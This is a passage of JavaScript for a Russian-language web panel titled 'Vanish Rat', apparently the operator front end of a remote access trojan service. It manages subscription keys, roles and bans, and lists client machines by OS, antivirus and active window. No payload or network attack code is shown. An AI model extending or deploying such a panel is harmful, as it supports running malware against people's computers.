        <input id="keyOut" readonly class="input-field w-full rounded-lg px-3 py-2 text-sm font-mono">
        <button id="keyCopy" type="button" class="btn-ghost w-full rounded-lg py-2 text-xs">Copy</button>
      </div>`;
    $('#keyGen').onclick = () => {
      const len = parseInt($('#keyLen').value, 10) || 32;
      const alpha = $('#keyAlpha').value;
      let out = '';
      if (alpha === 'uuid') {
        out = crypto.randomUUID();
      } else {
        const chars = alpha === 'hex' ? '0123456789abcdef' : 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz23456789';
        const arr = new Uint8Array(len);
        crypto.getRandomValues(arr);
        out = Array.from(arr, b => chars[b % chars.length]).join('');
      }
      $('#keyOut').value = out;
    };
    $('#keyCopy').onclick = () => {
      navigator.clipboard.writeText($('#keyOut').value || '');
      toast('Copied', 'success');
    };
  } else if (state.toolTab === 'psdec') {
    body.innerHTML = `
      <div class="space-y-3">
        <textarea id="psDecIn" class="input-field w-full rounded-lg px-3 py-2 text-sm font-mono min-h-[100px]" placeholder="powershell -enc ..."></textarea>
        <button id="psDecRun" type="button" class="btn-primary w-full rounded-lg py-2.5 text-sm">Decode</button>
        <pre id="psDecOut" class="text-xs font-mono bg-void/80 p-3 rounded-lg border border-border overflow-auto max-h-48 whitespace-pre-wrap">—</pre>
      </div>`;
    $('#psDecRun').onclick = () => {
      let inp = $('#psDecIn').value.trim();
      const m = inp.match(/-enc(?:odedcommand)?\s+([A-Za-z0-9+/=]+)/i);
      if (m) inp = m[1];
      try {
        const bin = atob(inp.replace(/\s+/g, ''));
        const bytes = new Uint8Array(bin.length);
        for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
        let text = '';
        for (let i = 0; i < bytes.length; i += 2) text += String.fromCharCode(bytes[i]);
        $('#psDecOut').textContent = text || '(empty)';
      } catch (e) {
        $('#psDecOut').textContent = 'decode error: ' + e.message;
      }
    };
  }
}

function panelLogs(logs) {
  const box = el('div', { className: 'fade-in' });
  box.innerHTML = `
    <div class="flex items-center justify-between mb-6">
      <h1 class="font-display text-xl tracking-wide">Логи</h1>
      <button id="exportLogs" type="button" class="btn-ghost rounded-lg px-3 py-1.5 text-xs flex items-center gap-2">
        <i data-lucide="download" width="14" height="14"></i> Сохранить
      </button>
    </div>`;
  if (!logs.length) {
    box.appendChild(el('div', { className: 'glass rounded-xl p-12 text-center text-muted text-sm' }, ['Логов нет']));
  } else {
    const list = el('div', { className: 'glass rounded-xl overflow-hidden max-h-[60vh] overflow-y-auto' });
    logs.forEach(l => {
      list.appendChild(el('div', { className: 'px-4 py-3 border-b border-border text-sm font-mono text-muted flex gap-4' }, [
        el('span', { className: 'text-accent/70 shrink-0' }, formatDate(l.ts)),
        el('span', {}, l.msg || l.text || '')
      ]));
    });
    box.appendChild(list);
  }
  setTimeout(() => {
    $('#exportLogs')?.addEventListener('click', () => {
      const text = logs.map(l => `[${formatDate(l.ts)}] ${l.msg || l.text}`).join('\n') || 'empty';
      const a = document.createElement('a');
      a.href = URL.createObjectURL(new Blob([text], { type: 'text/plain' }));
      a.download = `vanish_logs_${Date.now()}.txt`;
      a.click();
      toast('Сохранено', 'success');
    });
  }, 40);
  return box;
}

function panelSettings(user) {
  const box = el('div', { className: 'fade-in max-w-lg' });
  box.innerHTML = `
    <h1 class="font-display text-xl tracking-wide mb-6">Настройки</h1>
    <div class="glass rounded-xl p-6 space-y-4 text-sm">
      <div class="flex justify-between"><span class="text-muted">Логин</span><span class="font-mono">${esc(user.login)}</span></div>
      <div class="flex justify-between"><span class="text-muted">Роль</span><span>${user.roleId === 'r_operator' ? 'operator' : user.roleId === 'r_trial' ? 'trial' : 'user'}</span></div>
      <div class="flex justify-between"><span class="text-muted">Подписка</span><span>${user.sub?.type === 'lifetime' ? 'Навсегда' : user.sub?.until ? formatDate(user.sub.until) : '—'}</span></div>
      <div class="flex justify-between"><span class="text-muted">FP</span><span class="font-mono text-xs text-muted">${(user.fp || '').slice(0, 16)}…</span></div>
    </div>`;
  return box;
}

function viewAdmin() {
  if (!state.session || !Auth.isOperator(state.session)) {
    state.view = '404';
    logAudit(state.session?.login || 'anon', 'admin_denied', {});
    return view404();
  }
  const db = loadDB();
  const nav = `
    <div class="p-5 border-b border-border">
      <div class="font-display text-lg tracking-wider text-accent glow-text">VANISH</div>
      <div class="text-[10px] text-muted tracking-widest mt-0.5">OPERATOR</div>
    </div>
    <nav class="flex-1 p-3 space-y-1 nav-row">
      ${navBtn('dashboard', 'layout-dashboard', 'Дашборд', state.adminTab)}
      ${navBtn('users', 'users', 'Юзеры', state.adminTab)}
      ${navBtn('keys', 'key', 'Ключи', state.adminTab)}
      ${navBtn('clients', 'monitor', 'Клиенты', state.adminTab)}
      ${navBtn('bans', 'ban', 'Баны', state.adminTab)}
      ${navBtn('audit', 'scroll-text', 'Логи', state.adminTab)}
      ${navBtn('banner', 'megaphone', 'Баннер', state.adminTab)}
      ${navBtn('settings', 'settings', 'Настройки', state.adminTab)}
    </nav>
    <div class="p-4 border-t border-border">
      <button id="logoutBtn" type="button" class="text-xs text-muted hover:text-danger transition">Выйти</button>
    </div>`;

  let content;
  if (state.adminTab === 'dashboard') content = adminDashboard(db);
  else if (state.adminTab === 'users') content = adminUsers(db);
  else if (state.adminTab === 'keys') content = adminKeys(db);
  else if (state.adminTab === 'clients') content = adminClients(db);
  else if (state.adminTab === 'bans') content = adminBans(db);
  else if (state.adminTab === 'audit') content = adminAudit(db);
  else if (state.adminTab === 'banner') content = adminBanner(db);
  else content = adminSettings(db);

  return shellLayout(nav, content, true);
}

function adminDashboard(db) {
  const box = el('div', { className: 'fade-in' });
  const online = db.clients.filter(c => c.status === 'online').length;
  const activeUsers = db.users.filter(u => u.status === 'active').length;
  const recent = (db.audit || []).slice(-8).reverse();
  box.innerHTML = `
    <h1 class="font-display text-xl tracking-wide mb-6">Дашборд</h1>
    <div class="grid grid-cols-2 md:grid-cols-4 gap-3 grid-stats mb-6">
      <div class="stat-card"><div class="num">${db.users.length}</div><div class="text-xs text-muted mt-1">Юзеров</div></div>
      <div class="stat-card"><div class="num">${activeUsers}</div><div class="text-xs text-muted mt-1">Активных</div></div>
      <div class="stat-card"><div class="num">${online}</div><div class="text-xs text-muted mt-1">Клиенты online</div></div>
      <div class="stat-card"><div class="num">${(db.audit || []).length}</div><div class="text-xs text-muted mt-1">Событий</div></div>
    </div>
    <div class="glass rounded-xl p-5">
      <div class="text-xs text-muted uppercase tracking-wider mb-3">Последняя активность</div>
      ${recent.map(a => `
        <div class="flex gap-3 py-2 border-b border-border last:border-0 text-sm">
          <span class="text-accent/70 font-mono text-xs shrink-0 w-28">${formatDate(a.ts)}</span>
          <span class="text-muted text-xs shrink-0 w-20 truncate">${esc(a.actor)}</span>
          <span class="text-xs">${esc(a.action)}</span>
        </div>`).join('') || '<div class="text-muted text-sm">пусто</div>'}
    </div>`;
  return box;
}

function adminUsers(db) {
  const box = el('div', { className: 'fade-in' });
  box.innerHTML = `<h1 class="font-display text-xl tracking-wide mb-6">Юзеры</h1>`;
  const table = el('div', { className: 'glass rounded-xl overflow-hidden' });
  db.users.forEach(u => {
    const row = el('div', { className: 'px-4 py-3 border-b border-border flex flex-wrap items-center gap-3' });
    row.innerHTML = `
      <div class="flex-1 min-w-[120px]">
        <div class="text-sm font-medium">${esc(u.login)}</div>
        <div class="text-xs text-muted">${u.roleId} · ${u.status}</div>
      </div>
      <div class="text-xs text-muted">${formatDate(u.lastLogin || u.created)}</div>
      <button data-uid="${u.id}" type="button" class="ban-user text-xs text-danger">Бан</button>
      <button data-uid="${u.id}" type="button" class="view-user text-xs text-accent">Открыть</button>`;
    table.appendChild(row);
  });
  box.appendChild(table);
  setTimeout(() => {
    $$('.view-user').forEach(btn => {
      btn.onclick = () => {
        const u = db.users.find(x => x.id === btn.dataset.uid);
        if (u) showUserModal(u, db);
      };
    });
    $$('.ban-user').forEach(btn => {
      btn.onclick = () => {
        const db2 = loadDB();
        const u = db2.users.find(x => x.id === btn.dataset.uid);
        if (!u) return;
        u.status = 'banned';
        if (u.fp) db2.bans.push({ id: generateId('ban'), fp: u.fp, ua: u.ua, login: u.login, active: true, ts: Date.now() });
        auditPush(db2, state.session.login, 'user_ban', { login: u.login });
        saveDB(db2);
        toast('Забанен', 'warn');
        render();
      };
    });
  }, 40);
  return box;
}

function showUserModal(u, db) {
  const overlay = el('div', { className: 'fixed inset-0 bg-black/70 z-50 flex items-center justify-center p-4' });
  const keyObj = db.keys.find(k => k.id === u.keyId);
  const modal = el('div', { className: 'glass-strong rounded-2xl p-6 w-full max-w-md neon-border fade-in' });
  modal.innerHTML = `
    <div class="flex justify-between mb-4">
      <h2 class="font-display text-lg">${esc(u.login)}</h2>
      <button id="closeModal" type="button" class="text-muted"><i data-lucide="x" width="18" height="18"></i></button>
    </div>
    <div class="space-y-3 text-sm">
      <div class="flex justify-between"><span class="text-muted">Ключ</span><span class="font-mono text-xs">${esc(keyObj?.key || '—')}</span></div>
      <div class="flex justify-between"><span class="text-muted">UA</span><span class="text-xs truncate max-w-[200px]">${esc((u.ua || '').slice(0, 50))}</span></div>
      <div class="flex justify-between"><span class="text-muted">FP</span><span class="font-mono text-xs">${esc((u.fp || '').slice(0, 20))}…</span></div>
      <div class="flex justify-between"><span class="text-muted">Статус</span><span>${esc(u.status)}</span></div>
    </div>`;
  overlay.appendChild(modal);
  document.body.appendChild(overlay);
  if (window.lucide) lucide.createIcons();
  $('#closeModal').onclick = () => overlay.remove();
  overlay.onclick = e => { if (e.target === overlay) overlay.remove(); };
}

function adminKeys(db) {
  const box = el('div', { className: 'fade-in' });
  box.innerHTML = `
    <div class="flex items-center justify-between mb-6 flex-wrap gap-2">
      <h1 class="font-display text-xl tracking-wide">Ключи</h1>
      <button id="createKey" type="button" class="btn-primary rounded-lg px-4 py-2 text-sm">Создать</button>
    </div>`;
  const list = el('div', { className: 'glass rounded-xl overflow-hidden' });
  db.keys.forEach(k => {
    list.appendChild(el('div', { className: 'px-4 py-3 border-b border-border flex flex-wrap items-center gap-3 text-sm' }, [
      el('span', { className: 'font-mono text-accent' }, k.key),
      el('span', { className: 'text-muted' }, k.login || '—'),
      el('span', { className: 'text-xs text-muted' }, k.roleId),
      el('span', { className: 'text-xs' }, k.expires ? formatDate(k.expires) : 'lifetime'),
      el('button', { className: 'text-xs text-danger ml-auto del-key', type: 'button', 'data-kid': k.id }, 'Удалить')
    ]));
  });
  box.appendChild(list);
  setTimeout(() => {
    $('#createKey').onclick = () => {
      const login = prompt('Логин (пусто = любой):') || '';
      const role = prompt('Роль (r_user / r_trial / r_operator):', 'r_user') || 'r_user';
      const days = prompt('Дней (пусто = lifetime):', '');
      const db2 = loadDB();
      const key = generateKey();
      db2.keys.push({
        id: generateId('k'), key, login, roleId: role,
        expires: days ? Date.now() + parseInt(days, 10) * 86400000 : null,
        created: Date.now(), used: false
      });
      auditPush(db2, state.session.login, 'key_create', { key: key.slice(0, 4) + '****', role });
      saveDB(db2);
      toast('Ключ: ' + key, 'success');
      render();
    };
    $$('.del-key').forEach(btn => {
      btn.onclick = () => {
        const db2 = loadDB();
        db2.keys = db2.keys.filter(k => k.id !== btn.dataset.kid);
        auditPush(db2, state.session.login, 'key_delete', { id: btn.dataset.kid });
        saveDB(db2);
        render();
      };
    });
  }, 40);
  return box;
}

function adminClients(db) {
  const box = el('div', { className: 'fade-in' });
  box.innerHTML = `
    <div class="flex items-center justify-between mb-6 flex-wrap gap-2">
      <h1 class="font-display text-xl tracking-wide">Клиенты</h1>
      <button id="addClient" type="button" class="btn-primary rounded-lg px-4 py-2 text-sm">Добавить</button>
    </div>`;
  const list = el('div', { className: 'space-y-2' });
  db.clients.forEach(c => {
    list.appendChild(el('div', { className: 'glass rounded-xl p-4 flex items-center gap-4 card-hover' }, [
      el('div', { className: 'flex-1 min-w-0' }, [
        el('div', { className: 'text-sm font-medium' }, c.name),
        el('div', { className: 'text-xs text-muted truncate' }, `${c.device} · ${c.os} · ${c.av} · ${c.activeWindow}`)
      ]),
      el('button', { className: 'text-xs text-danger del-client', type: 'button', 'data-cid': c.id }, 'Удалить')
    ]));
  });
  box.appendChild(list);
  setTimeout(() => {
    $('#addClient').onclick = () => {
      const name = prompt('Имя:', 'PC-' + Math.floor(Math.random() * 9000 + 1000));
      if (!name) return;
      const device = prompt('Устройство:', 'Desktop') || 'Desktop';
      const os = prompt('OS:', 'Windows 11') || 'Windows 11';
      const av = prompt('AV:', 'Windows Defender') || 'Windows Defender';
      const win = prompt('Окно:', 'chrome.exe') || 'chrome.exe';
      const owner = prompt('Owner login:', '') || '';
      const db2 = loadDB();
      const ownerUser = owner ? db2.users.find(u => u.login === owner) : null;
      db2.clients.push({
        id: generateId('c'), name, device, os, av, activeWindow: win,
        status: 'online', ownerId: ownerUser?.id || null, ts: Date.now()
      });
      auditPush(db2, state.session.login, 'client_add', { name });
      saveDB(db2);
      toast('Добавлен', 'success');
      render();
    };
    $$('.del-client').forEach(btn => {
      btn.onclick = () => {
        const db2 = loadDB();
        db2.clients = db2.clients.filter(c => c.id !== btn.dataset.cid);
        auditPush(db2, state.session.login, 'client_del', { id: btn.dataset.cid });
        saveDB(db2);
        render();
      };
    });
  }, 40);
  return box;
}

function adminBans(db) {
  const box = el('div', { className: 'fade-in' });
  box.innerHTML = `<h1 class="font-display text-xl tracking-wide mb-6">Баны</h1>`;
  const list = el('div', { className: 'glass rounded-xl overflow-hidden' });
  if (!db.bans.length) {
    list.appendChild(el('div', { className: 'p-8 text-center text-muted text-sm' }, 'Банов нет'));
  } else {
    db.bans.forEach(b => {
      list.appendChild(el('div', { className: 'px-4 py-3 border-b border-border flex flex-wrap items-center gap-3 text-sm' }, [
        el('span', { className: 'font-mono text-xs' }, (b.fp || '').slice(0, 20) + '…'),
        el('span', { className: 'text-muted' }, b.login || '—'),
        el('span', { className: b.active ? 'text-danger text-xs' : 'text-muted text-xs' }, b.active ? 'ACTIVE' : 'off'),
        el('button', { className: 'text-xs text-accent ml-auto unban', type: 'button', 'data-bid': b.id }, 'Разбан')
      ]));
    });
  }
  box.appendChild(list);
  setTimeout(() => {
    $$('.unban').forEach(btn => {
      btn.onclick = () => {
        const db2 = loadDB();
        const ban = db2.bans.find(b => b.id === btn.dataset.bid);
        if (ban) ban.active = false;
        const u = db2.users.find(x => x.fp === ban?.fp);
        if (u) u.status = 'active';
        auditPush(db2, state.session.login, 'unban', { fp: ban?.fp?.slice(0, 12) });
        saveDB(db2);
        toast('Разбан', 'success');
        render();
      };
    });
  }, 40);
  return box;
}

function adminAudit(db) {
  const box = el('div', { className: 'fade-in' });
  const audit = (db.audit || []).slice().reverse();
  box.innerHTML = `
    <div class="flex items-center justify-between mb-6 flex-wrap gap-2">
      <h1 class="font-display text-xl tracking-wide">Логи (вечные)</h1>
      <div class="flex gap-2">
        <input id="auditFilter" type="text" placeholder="фильтр..." class="input-field rounded-lg px-3 py-1.5 text-xs w-36">
        <button id="auditExport" type="button" class="btn-ghost rounded-lg px-3 py-1.5 text-xs">Экспорт</button>
      </div>
    </div>
    <p class="text-xs text-muted mb-3">Очистка недоступна. Все действия, попытки devtools, входы.</p>
    <div id="auditList" class="glass rounded-xl overflow-hidden max-h-[65vh] overflow-y-auto"></div>`;
  const renderList = (filter) => {
    const list = $('#auditList');
    if (!list) return;
    list.innerHTML = '';
    const items = filter
      ? audit.filter(a => JSON.stringify(a).toLowerCase().includes(filter.toLowerCase()))
      : audit;
    items.forEach(a => {
      list.appendChild(el('div', { className: 'audit-row px-4 py-2.5 border-b border-border text-xs font-mono flex flex-wrap gap-2' }, [
        el('span', { className: 'text-accent/70 w-28 shrink-0' }, formatDate(a.ts)),
        el('span', { className: 'text-muted w-16 shrink-0 truncate' }, a.actor),
        el('span', { className: 'text-glow' }, a.action),
        el('span', { className: 'text-muted truncate' }, a.meta ? JSON.stringify(a.meta).slice(0, 80) : '')
      ]));
    });
    if (!items.length) list.appendChild(el('div', { className: 'p-8 text-center text-muted' }, 'пусто'));
  };
  setTimeout(() => {
    renderList('');
    $('#auditFilter').oninput = e => renderList(e.target.value);
    $('#auditExport').onclick = () => {
      const text = audit.map(a => `[${formatDate(a.ts)}] ${a.actor} ${a.action} ${JSON.stringify(a.meta || {})}`).join('\n');
      const a = document.createElement('a');
      a.href = URL.createObjectURL(new Blob([text], { type: 'text/plain' }));
      a.download = `vanish_audit_${Date.now()}.txt`;
      a.click();
    };
  }, 40);
  return box;
}

function adminBanner(db) {
  const b = db.banner || {};
  const box = el('div', { className: 'fade-in max-w-xl' });
  box.innerHTML = `
    <h1 class="font-display text-xl tracking-wide mb-6">Баннер / реклама</h1>
    <div class="glass rounded-xl p-5 space-y-4">
      <label class="flex items-center gap-3 text-sm">
        <input type="checkbox" id="bnEnabled" ${b.enabled ? 'checked' : ''} class="accent-accent"> Включён
      </label>
      <div>
        <label class="text-xs text-muted mb-1.5 block">Текст</label>
        <textarea id="bnText" class="input-field w-full rounded-lg px-3 py-2 text-sm min-h-[80px]">${esc(b.text)}</textarea>
      </div>
      <div>
        <label class="text-xs text-muted mb-1.5 block">URL медиа (img / gif / video)</label>
        <input id="bnMedia" type="text" value="${esc(b.media)}" class="input-field w-full rounded-lg px-3 py-2 text-sm font-mono">
      </div>
      <div>
        <label class="text-xs text-muted mb-1.5 block">Тип</label>
        <select id="bnType" class="input-field w-full rounded-lg px-3 py-2 text-sm">
          <option value="image" ${b.mediaType === 'image' ? 'selected' : ''}>image/gif</option>
          <option value="video" ${b.mediaType === 'video' ? 'selected' : ''}>video</option>
        </select>
      </div>
      <div>
        <label class="text-xs text-muted mb-1.5 block">Секунд до закрытия</label>
        <input id="bnSec" type="number" min="3" max="30" value="${b.dismissAfter || 5}" class="input-field w-full rounded-lg px-3 py-2 text-sm">
      </div>
      <button id="bnSave" type="button" class="btn-primary w-full rounded-lg py-2.5 text-sm">Сохранить</button>
    </div>`;
  setTimeout(() => {
    $('#bnSave').onclick = () => {
      const db2 = loadDB();
      db2.banner = {
        enabled: $('#bnEnabled').checked,
        text: $('#bnText').value,
        media: $('#bnMedia').value.trim(),
        mediaType: $('#bnType').value,
        dismissAfter: parseInt($('#bnSec').value, 10) || 5
      };
      auditPush(db2, state.session.login, 'banner_update', { enabled: db2.banner.enabled });
      saveDB(db2);
      toast('Баннер сохранён', 'success');
    };
  }, 40);
  return box;
}

function adminSettings(db) {
  const s = db.settings || {};
  const box = el('div', { className: 'fade-in max-w-lg' });
  box.innerHTML = `
    <h1 class="font-display text-xl tracking-wide mb-6">Настройки сайта</h1>
    <div class="glass rounded-xl p-5 space-y-4">
      <div>
        <label class="text-xs text-muted mb-1.5 block">Title вкладки</label>
        <input id="stTitle" type="text" value="${esc(s.title)}" class="input-field w-full rounded-lg px-3 py-2 text-sm">
      </div>
      <div>
        <label class="text-xs text-muted mb-1.5 block">Домен</label>
        <input id="stDomain" type="text" value="${esc(s.domain)}" class="input-field w-full rounded-lg px-3 py-2 text-sm font-mono">
      </div>
      <div>
        <label class="text-xs text-muted mb-1.5 block">Admin gate (hash)</label>
        <input id="stGate" type="text" value="${esc(s.adminGate)}" class="input-field w-full rounded-lg px-3 py-2 text-sm font-mono">
        <p class="text-[11px] text-muted mt-1">Вход в админку: после логина operator открой #${esc(s.adminGate)}</p>
      </div>
      <button id="stSave" type="button" class="btn-primary w-full rounded-lg py-2.5 text-sm">Сохранить</button>
    </div>`;
  setTimeout(() => {
    $('#stSave').onclick = () => {
      const db2 = loadDB();
      db2.settings.title = $('#stTitle').value.trim() || 'Vanish Rat';
      db2.settings.domain = $('#stDomain').value.trim();
      db2.settings.adminGate = $('#stGate').value.trim() || 'vanish_op_7x9k';
      auditPush(db2, state.session.login, 'settings_update', {});
      saveDB(db2);
      document.title = db2.settings.title;
      toast('Сохранено', 'success');
    };
  }, 40);
  return box;
}

function viewBanned() {
  const wrap = el('div', { className: 'min-h-screen flex items-center justify-center' });
  wrap.innerHTML = `<div class="text-center"><div class="font-display text-2xl text-danger mb-2">ACCESS DENIED</div><div class="text-sm text-muted">fingerprint blocked</div></div>`;
  return wrap;
}

function view404() {
  const wrap = el('div', { className: 'min-h-screen flex items-center justify-center' });
  wrap.innerHTML = `
    <div class="text-center fade-in">
      <div class="font-display text-6xl text-accent/30 mb-4">404</div>
      <div class="font-display text-xl glow-text text-accent mb-2">VANISH</div>
      <div class="text-sm text-muted mb-6">Не найдено</div>
      <a href="/" class="btn-ghost rounded-lg px-6 py-2 text-sm inline-block">На главную</a>
    </div>`;
  return wrap;
}

document.addEventListener('DOMContentLoaded', init);
window.addEventListener('hashchange', () => {
  const db = loadDB();
  const gate = (location.hash || '').replace(/^#\/?/, '');
  if (gate === db.settings.adminGate && state.session && Auth.isOperator(state.session)) {
    state.view = 'admin';
    logAudit(state.session.login, 'admin_enter', { hash: true });
    render();
  }
});
